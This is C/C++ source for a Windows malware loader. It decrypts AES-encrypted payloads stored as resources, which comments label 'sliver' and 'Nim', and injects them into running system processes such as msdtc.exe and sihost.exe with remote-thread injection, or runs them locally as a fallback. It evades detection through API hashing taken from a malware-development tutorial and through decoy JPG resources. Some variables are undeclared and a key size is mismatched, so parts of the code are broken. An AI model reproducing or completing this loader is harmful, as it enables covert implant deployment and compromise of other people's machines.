#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <tlhelp32.h>
#include "Resource.h"
#include <time.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

DWORD FindTarget(const char* procname)
{
    DWORD aProcIDs[1024];
    DWORD dwNeeded = 0;
    DWORD dwActualNum = 0;
    HANDLE hProc = NULL;
    CHAR szProcName[MAX_PATH];

    if (!EnumProcesses(aProcIDs, sizeof(aProcIDs), &dwNeeded))
    {
        return 0;
    }

    dwActualNum = dwNeeded / sizeof(DWORD);

    for (DWORD i = 0; i < dwActualNum; i++)
    {
        if (aProcIDs[i] != 0)
        {
            hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcIDs[i]);
            GetModuleBaseNameA(hProc, NULL, szProcName, sizeof(szProcName) / sizeof(TCHAR));
            if (std::string(procname) == szProcName)
            {
                CloseHandle(hProc);
                return aProcIDs[i];
            }
            CloseHandle(hProc);
        }
    }
    return 0;
}

int Inject(HANDLE hProc, unsigned char* point, unsigned int pointLen)
{
    LPVOID pRemoteCode = 0;
    HANDLE hThread = 0;
    DWORD dwWritten;

    pRemoteCode = VirtualAllocEx(hProc, NULL, pointLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pRemoteCode)
    {
        return -1;
    }

    if (!WriteProcessMemory(hProc, pRemoteCode, (PVOID)point, (SIZE_T)pointLen, (SIZE_T*)&dwWritten))
    {
        return -1;
    }

    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL)
    {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        return 0;
    }

    return -1;
}

//AES decrypt
int AESDec(char* size, unsigned int size_len, char* encryptionKey, size_t keySize) {
	HCRYPTPROV hHash;
	HCRYPTHASH hHaHash;
	HCRYPTKEY hencryptionKey;

	if (!CryptAcquireContextW(&hHash, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hHash, CALG_SHA_256, 0, 0, &hHaHash)) {
		return -1;
	}
	if (!CryptHashData(hHaHash, (BYTE*)encryptionKey, (DWORD)keySize, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hHash, CALG_AES_256, hHaHash, 0, &hencryptionKey)) {
		return -1;
	}

	if (!CryptDecrypt(hencryptionKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)size, (DWORD*)&size_len)) {
		return -1;
	}

	CryptReleaseContext(hHash, 0);
	CryptDestroyHash(hHaHash);
	CryptDestroyKey(hencryptionKey);

	return 0;
}

//API hashing "https://0xpat.github.io/Malware_development_part_4/"
//VirtualAlloc + CreateThread + WaitForSingleObject
typedef PVOID(WINAPI* PVirtAll)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI* PCrTh)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
typedef PVOID(WINAPI* PWSO)(HANDLE, DWORD);

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j = 0;

    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[j];
        j = (j + 1) % key_len;
    }
}

unsigned int hash(const char* str)
{
	char junk1[] = { 0x5c, 0x50, 0x40, 0x5d };
	char junk2[] = { 0x6b, 0x67, 0x75, 0x64, 0x63, 0x71, 0x70, 0x36, 0x65, 0x39, 0x6d, 0x37, 0x52, 0x54, 0x45, 0x74 };
	XOR(sJKDSJDjsd, sizeof(sJKDSJDjsd), ssdaassss, sizeof(ssdaassss));
	unsigned int asasdrfe;
	sscanf_s(sJKDSJDjsd, "%d", &asasdrfe);
	unsigned int hash = asasdrfe;
	int c;
	while (c = *str++)
		hash = ((hash << 5) + hash) + c;

	return hash;
}

//Bypass cmd pop-up
int WINAPI WinMain(HINSTANCE hREF, HINSTANCE hPr7yutjghtance,
	LPSTR lpCm54yrthgfe, int nCm54yrthfgow) {

	srand(time(NULL));
	void* pointToExec;
  void* pointToExecNim;
	BOOL boolLoo;
	BOOL boolLooNim;
	HANDLE thr;
	HANDLE thrNim;
	DWORD pointWord = 0;

	//AES Nim
	char keyNim[] = { 0xaa, 0x8c, 0xb4, 0xd5, 0x35, 0xbd, 0x1c, 0x27, 0xd, 0x47, 0xd2, 0x4e, 0x8a, 0x6f, 0xb4, 0xe7 };
	HRSRC checkNim = FindResource(NULL, MAKEINTRESOURCE(IDR_FILE_NIM1), L"FILE_NIM");
	DWORD sizeNim = SizeofResource(NULL, checkNim);
	HGLOBAL dataNim = LoadResource(NULL, checkNim);

	//Garbage
	HRSRC resource21 = FindResource(NULL, MAKEINTRESOURCE(IDR_FILE_21), L"MFUIUKS1_JPG");
	DWORD RSize21 = SizeofResource(NULL, resource21);
	HGLOBAL resouceData21 = LoadResource(NULL, resource21);

	//API hashing https://0xpat.github.io/Malware_development_part_4/
	HMODULE mod = GetModuleHandle(L"kernel32.dll");
	PVirtAll funVirAll = 0;
	PCrTh Cd = 0;
	PWSO WO = 0;
	
	//API hashing
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)mod;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)mod + pDosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (pNtHeader->OptionalHeader);
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)mod + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PULONG pAddressOfFunctions = (PULONG)((PBYTE)mod + pExportDirectory->AddressOfFunctions);
	PULONG pAddressOfNames = (PULONG)((PBYTE)mod + pExportDirectory->AddressOfNames);
	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)mod + pExportDirectory->AddressOfNameOrdinals);

	for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
	{
		PCSTR pFunctionName = (PSTR)((PBYTE)mod + pAddressOfNames[i]);
		if (hash(pFunctionName) == 0x80fa57e1)
		{
			funVirAll = (PVirtAll)((PBYTE)mod + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
		if (hash(pFunctionName) == 0xc7d73c9b)
		{
			Cd = (PCrTh)((PBYTE)mod + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
		if (hash(pFunctionName) == 0x50c272c4)
		{
			WO = (PWSO)((PBYTE)mod + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
	}

	void* e34tregxec21 = funVirAll(0, RSize21, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//AES key sliver
	char keySliver[] = { 0xc8, 0xac, 0x9c, 0x3a, 0x2, 0xc9, 0x2e, 0x60, 0xa8, 0xc5, 0x8c, 0xc2, 0x96, 0x1f, 0xbe, 0x97 };

	//AES encrypted payload sliver
	HRSRC check = FindResource(NULL, MAKEINTRESOURCE(IDR_FILE_SLIV1), L"FILE_SLIV");
	DWORD size = SizeofResource(NULL, check);
	HGLOBAL data = LoadResource(NULL, check);

	//Garbage
	HRSRC resource24 = FindResource(NULL, MAKEINTRESOURCE(IDR_FILE_31), L"MFUIUKS23_JPG");
	DWORD RSize24 = SizeofResource(NULL, resource24);
	HGLOBAL resouceData24 = LoadResource(NULL, resource24);

	void* pointGarb = funVirAll(0, RSize24, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	//alloc
	pointToExec = funVirAll(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//memcpy
	memcpy(pointToExec, data, size);
	//decrypt
	AESDec((char*)pointToExec, size, key, sizeof(key));

	//alloc
	pointToExecNim = funVirAll(0, sizeNim, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//memcpy
	memcpy(pointToExecNim, dataNim, sizeNim);
	//decrypt
	AESDec((char*)pointToExecNim, sizeNim, keyNim, sizeof(key));

	int procTo = 0;
	int procTo2 = 0;
	int procTo3 = 0;
	int procTo4 = 0;
	int procTo5 = 0;
	int procTo6 = 0;
	HANDLE handlll = NULL;
	
	procTo = FindTarget("PhoneExperienceHost.exe");
	procTo2 = FindTarget("msdtc.exe");
	procTo3 = FindTarget("audiodg.exe");
	procTo4 = FindTarget("MSBuild.exe");
	procTo5 = FindTarget("msteams.exe");
	procTo6 = FindTarget("sihost.exe");

	//Garbage
	HRSRC resource23 = FindResource(NULL, MAKEINTRESOURCE(IDR_FILE_11), L"MFUIUKS2_JPG");
	DWORD RSize23 = SizeofResource(NULL, resource23);
	HGLOBAL resouceData23 = LoadResource(NULL, resource23);

	void* e34tregxec2 = funVirAll(0, RSize23, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	//if thread cannot be found, start new process
	if (procTo || procTo2 || procTo3 || procTo4 || procTo5 || procTo6) {
		// try to open target process
		int check = 0;
	    int checkNim = 0;

		//Find which PID was the first that was found
		if (procTo) {
			check = procTo;
		}
		else if (procTo2) {
			check = procTo2;
		}
		else if (procTo3) {
			check = procTo3;
		}
		else if (procTo4) {
			check = procTo4;
		}
		else if (procTo5) {
			check = procTo5;
		}
		else if (procTo6) {
			check = procTo6;
		}

		//Call it
		handlll = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
			FALSE, (DWORD)check);

		//Inject it
		if (handlll != NULL) {
			//Inject(handlll, tirosikowloi, kseksiwusolLLOO);
			Inject(handlll, (unsigned char*)pointToExec, size);
			CloseHandle(handlll);
		}

		if ((procTo != check) and (procTo > 0)) {
			checkNim = procTo;
		}
		else if ((procTo2 != check) and (procTo2 > 0)) {
			checkNim = procTo2;
		}
		else if ((procTo3 != check) and (procTo3 > 0)) {
			checkNim = procTo3;
		}
		else if ((procTo4 != check) and (procTo4 > 0)) {
			checkNim = procTo4;
		}
		else if ((procTo5 != check) and (procTo5 > 0)) {
			checkNim = procTo5;
		}
		else if ((procTo6 != check) and (procTo6 > 0)) {
			checkNim = procTo6;
		}

		//Call it
		handlll = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
			PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
			FALSE, (DWORD)checkNim);

		//Inject it
		if (handlll != NULL) {
			//Inject(handlll, tirosikowloi, kseksiwusolLLOO);
			Inject(handlll, (unsigned char*)pointToExecNim, sizeNim);
			CloseHandle(handlll);
		}

	}
	else {
		//If procInject fails, create a thread, i.e., a new process
		boolLoo = VirtualProtect(pointToExec, size, PAGE_EXECUTE_READ, &pointWord);

		boolLooNim = VirtualProtect(pointToExecNim, sizeNim, PAGE_EXECUTE_READ, &pointWord);

		if (boolLoo != 0) {
			thr = Cd(0, 0, (LPTHREAD_START_ROUTINE)pointToExec, 0, 0, 0);
			WO(thr, -1);
		}

		if (boolLooNim != 0) {
			thrNim = Cd(0, 0, (LPTHREAD_START_ROUTINE)pointToExecNim, 0, 0, 0);
			WO(thrNim, -1);
		}
	}
  
	return 0;
}
